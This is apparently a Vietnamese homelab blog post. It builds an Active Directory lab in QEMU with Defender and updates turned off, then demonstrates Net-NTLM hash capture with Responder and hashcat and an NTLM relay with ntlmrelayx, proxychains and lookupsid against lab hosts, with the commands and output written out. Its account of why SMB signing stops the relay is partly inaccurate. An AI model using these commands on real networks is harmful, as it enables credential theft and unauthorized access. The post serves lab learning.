---
title: "Xây dựng lab Active Directory và thực hành các scenerios attack đơn giản"
date: 2025-10-30 12:00:00 +0700
categories: [Homelab, Security]
tags: [active-directory, windows-server, lab, qemu, Net-NTLM]
image:
  path: /assets/img/posts/Active_Directory_Lab/image-34.png
  alt: Active Directory Lab
---

## Giới thiệu

Trong quá trình thực hiện các bài CTF network forensics, mình có gặp ldap nhưng không hiểu nó là cái gì. Mình quyết định xây dựng một active directory lab đơn giản và 1 vài Scenario cũng đơn giản nhằm hiểu thêm về active diretory.

## Cài đặt môi tr     ường
Thông thường mình sẽ dùng VMware, nhưng mình có nghe đến qemu trên linux nên lần này mình sẽ dùng qemu, quickemu cho bài lab này
### 1. Cài đặt QEMU

```bash
sudo apt-add-repository ppa:flexiondotorg/quickemu
sudo apt update
sudo apt install quickemu
```

### 2. Tải Windows Server 2022

```bash
quickget windows-server 2022
```
Tải kiểu này tương đối lâu nên mình dùng aria2c (hoặc browser)

```bash
aria2c -x 16 -s 16 https://software-static.download.prss.microsoft.com/sg/download/888969d5-f34g-4e03-ac9d-1f9786c66749/SERVER_EVAL_x64FRE_en-us.iso
```

### 3. Tạo máy ảo

```bash
quickget --create-config windows-server-2022 ./SERVER_EVAL_x64FRE_en-us.iso
quickemu --vm windows-server-2022.conf
```
Để thuận tiện, minh sẽ dùng virt-manager
![](/assets/img/posts/Active_Directory_Lab/image.png)
![](/assets/img/posts/Active_Directory_Lab/image-2.png)
![](/assets/img/posts/Active_Directory_Lab/image-3.png)

## Cấu hình Domain Controller

### 1. Thiết lập cơ bản

![Cấu hình IP](/assets/img/posts/Active_Directory_Lab/image-4.png)

- Đổi tên máy (Computer Name)

![Đổi tên máy](/assets/img/posts/Active_Directory_Lab/image-5.png)

### 2. Cài đặt Active Directory Domain Services

Vào Server Manager → Add Roles and Features

![Add Roles](/assets/img/posts/Active_Directory_Lab/image-6.png)

Chọn Active Directory Domain Services

![Chọn AD DS](/assets/img/posts/Active_Directory_Lab/image-7.png)

### 3. Promote to Domain Controller

![Promote DC](/assets/img/posts/Active_Directory_Lab/image-10.png)

- Tạo forest mới
- Đặt tên domain blue.lab
- Tạo DSRM password (dùng để restore AD khi gặp sự cố)
Forest bao gồm nhiều tree. tree gồm các domain có thể kết nối với nhau.

Chờ cài đặt hoàn tất

![Cài đặt](/assets/img/posts/Active_Directory_Lab/image-11.png)

Như vậy ta đã có 1 domain blue.lab. Tiếp đến ta sẽ cấu hình policy cho domain này. Cụ thế là tắt update và diệt virus.

## Cấu hình Group Policy

### 1. Mở Group Policy Management
GPO là Group Policy Object. Object có thể User, Computer,... OU là organizaion units, bao gồm nhiều object. GPO giúp quản trị viên cài đặt cấu hình cho hàng nghìn máy tính và người dùng cùng một lúc mà không cần phải chạy đến từng máy để chỉnh sửa.

ĐểChạy `gpmc.msc`

![GPMC](/assets/img/posts/Active_Directory_Lab/image-12.png)

### 2. Tạo GPO mới

![Tạo GPO](/assets/img/posts/Active_Directory_Lab/image-13.png)

### 3. Cấu hình Policy

Click phải GPO → Edit

![Edit Policy](/assets/img/posts/Active_Directory_Lab/image-14.png)

**Tắt Windows Defender:**

![Tắt Defender](/assets/img/posts/Active_Directory_Lab/image-15.png)
![Cấu hình](/assets/img/posts/Active_Directory_Lab/image-16.png)

**Tắt Windows Update:**

![Tắt Update](/assets/img/posts/Active_Directory_Lab/image-17.png)
![Cấu hình](/assets/img/posts/Active_Directory_Lab/image-18.png)

Cập nhật policy ngay trong powershell (Nếu không phải chờ 90' mới cập nhật)

![PowerShell](/assets/img/posts/Active_Directory_Lab/image-19.png)
Đã xong phần DC. Tiếp đến ta sẽ thêm 1 máy khác để join vào domain này.
## Quản lý User

### Tạo user mới

```powershell
New-ADUser -Name "john" -SamAccountName "john" -UserPrincipalName "john@blue.lab" -AccountPassword (ConvertTo-SecureString -AsPlainText "Depzai123@" -Force) -Enabled $true
```

![User mới](/assets/img/posts/Active_Directory_Lab/image-20.png)

## Thêm Windows 10 Workstation

### 1. Tạo máy Windows 10

```bash
quickget --create-config windows-10 ./Win10_22H2_EnglishInternational_x64v1.iso
```
Sau đó làm tương tự các bước tạo máy ảo như trên
### 2. Cấu hình DNS
Hiện tại, 

![Cấu hình DNS](/assets/img/posts/Active_Directory_Lab/image-21.png)


Đặt DNS trỏ về IP của Domain Controller

![Cấu hình DNS](/assets/img/posts/Active_Directory_Lab/image-22.png)

![Join thành công](/assets/img/posts/Active_Directory_Lab/image-23.png)

### 3. Join Domain

System → Advanced settings → Computer Name → Change 

Hoặc qua System Settings:

![System Settings](/assets/img/posts/Active_Directory_Lab/image-24.png)

### 4. Kiểm tra

Trên DC, mở `dsa.msc` để xem máy đã join:

![Kiểm tra máy](/assets/img/posts/Active_Directory_Lab/image-25.png)

Trên Win10, kiểm tra
![Group Policy áp dụng](/assets/img/posts/Active_Directory_Lab/image-26.png)

Như vậy ta đã vào được user john trên active directory
![Policy result](/assets/img/posts/Active_Directory_Lab/image-27.png)

Các policy đã được áp dụng bao gồm việc tắt windows defend, và update

# Basic Attack

## Net-NTLM Capture Attack

Ở đây ta sẽ giả mạo một SMB server. SMB là giao thức cho việc chia sẻ file. NTLM là một giao thức xác thực người dùng cũ bằng challenge - response. Cụ thể, quy trình như sau:
- Giả mạo server (sử dụng responder)
- Lừa user xác thực với server
- responder gửi challenge (bytes random) cho user
- User gửi Net-NTLM cho server. Net-NTLM là hash bao gồm mật khẩu và challenge.
- Responder crack hash 

Đầu tiên, tải các công cụ:
```
pip install impacket
pip install netifaces
git clone https://github.com/lgandx/Responder.git
```
Sử dụng Responder với interface virbr0 là interface của qemu

![Kerberoasting](/assets/img/posts/Active_Directory_Lab/image-28.png)

Lừa user xác thực qua server giả mạo
![Lấy hash](/assets/img/posts/Active_Directory_Lab/image-29.png)

responder thu được hash
![Hash](/assets/img/posts/Active_Directory_Lab/image-30.png)

Crack hash bằng hashcat (hoặc john):

```bash
hashcat -m 5600 hash.txt passwords.txt --force
```

![Crack thành công](/assets/img/posts/Active_Directory_Lab/image-31.png)
Ta thu được mật khẩu Depzai123@


## Net-NTLM Relay Attack
Trong trường hợp không crack được password, ta có thể man-in-the-middle attack. Cụ thể:
- Server giả mạo sẽ kết nối đến server thật.
- Server thật gửi challenge.
- Server giả mạo thực hiện tương tự Net-NTLM Capture Attack, lấy response và gửi cho server thật -> xác thực thành công. 

Sử dụng công cụ ntlmrelayx của impacket (chuyên dùng để khai thác các giao thức mạng Windows) với target là server thật. Như vậy, nếu lừa được bất kì user nào xác thực với server giả mạo, ntlmrelayx sẽ tạo được phiên kết nối với server thật.
```
nqghuy@nqghuy ~/P/Responder (master)> sudo /home/nqghuy/miniforge3/bin/ntlmrelayx.py --no-http-server -smb2support -t smb://192.168.122.204 -socks
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
```
Ta đã bắt được response thành công
![alt text](/assets/img/posts/Active_Directory_Lab/image-32.png)
<!-- ![alt text](/assets/img/posts/Active_Directory_Lab/image-33.png) -->
proxychains lookupsid.py -no-pass -domain-sids blue/john@192.168.122.121

Ở trên flag -socks cho phép tạo ra một socks proxy cổng 1080. Socks proxy này đóng vai trò trung gian, giúp thực hiện tiếp các bước attack tiếp theo
```
nqghuy@nqghuy ~> netstat -tlnp | grep 1080
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      -   
```

```
nqghuy@nqghuy ~> tail  /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 1080
```

Tiếp theo sử dụng lookupsid.py trong impacket, dùng để liệt kê bằng cách tìm tài khoản người dùng, nhóm, và máy tính trên một máy chủ Windows bằng cách dò tìm các SID. Công cụ này sử dụng với proxychains, do đó lệnh lookupspid.py sẽ đi qua cổng 1080, đi vào socket proxy và vào phiên kết nối đang được thiệt lập
```
nqghuy@nqghuy ~> sudo proxychains /home/nqghuy/miniforge3/bin/lookupsid.py -no-pass -domain-sids BLUE/john@192.168.122.204
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.122.204
[*] StringBinding ncacn_np:192.168.122.204[\pipe\lsarpc]
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.122.204:445-<><>-OK
[*] Domain SID is: S-1-5-21-2811635631-4027663537-3139941311
498: BLUE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: BLUE\Administrator (SidTypeUser)
501: BLUE\Guest (SidTypeUser)
502: BLUE\krbtgt (SidTypeUser)
512: BLUE\Domain Admins (SidTypeGroup)
513: BLUE\Domain Users (SidTypeGroup)
514: BLUE\Domain Guests (SidTypeGroup)
515: BLUE\Domain Computers (SidTypeGroup)
516: BLUE\Domain Controllers (SidTypeGroup)
517: BLUE\Cert Publishers (SidTypeAlias)
518: BLUE\Schema Admins (SidTypeGroup)
519: BLUE\Enterprise Admins (SidTypeGroup)
520: BLUE\Group Policy Creator Owners (SidTypeGroup)
521: BLUE\Read-only Domain Controllers (SidTypeGroup)
522: BLUE\Cloneable Domain Controllers (SidTypeGroup)
525: BLUE\Protected Users (SidTypeGroup)
526: BLUE\Key Admins (SidTypeGroup)
527: BLUE\Enterprise Key Admins (SidTypeGroup)
553: BLUE\RAS and IAS Servers (SidTypeAlias)
571: BLUE\Allowed RODC Password Replication Group (SidTypeAlias)
572: BLUE\Denied RODC Password Replication Group (SidTypeAlias)
1000: BLUE\DC01$ (SidTypeUser)
1101: BLUE\DnsAdmins (SidTypeAlias)
1102: BLUE\DnsUpdateProxy (SidTypeGroup)
1113: BLUE\john (SidTypeUser)
1114: BLUE\QUICKEM-3N1IIOL$ (SidTypeUser)
[-] Error while reading from remote
```
Ta đã liệt kê thành công

### Vậy tại sao bật signing thì fail.
Chữ kí số có tác dụng xác thực. Khi user gửi response đi sẽ có kèm cả ip của client. Server giả mạo không có chữ kí thật, không thể sửa đổi response, chữ có thể truyền nguyên vẹn. Do đó sau khi server thật nhận được, xác minh ip và thấy sai địa chỉ -> ngắt kết nối
# Kết luận
Một bài lab đơn giản, không quá phức tạp nhưng giúp mình hiểu hơn về Active Directory, cùng với đó là 2 attack scenerio xảy ra do sai sót của user và lỗi cấu hình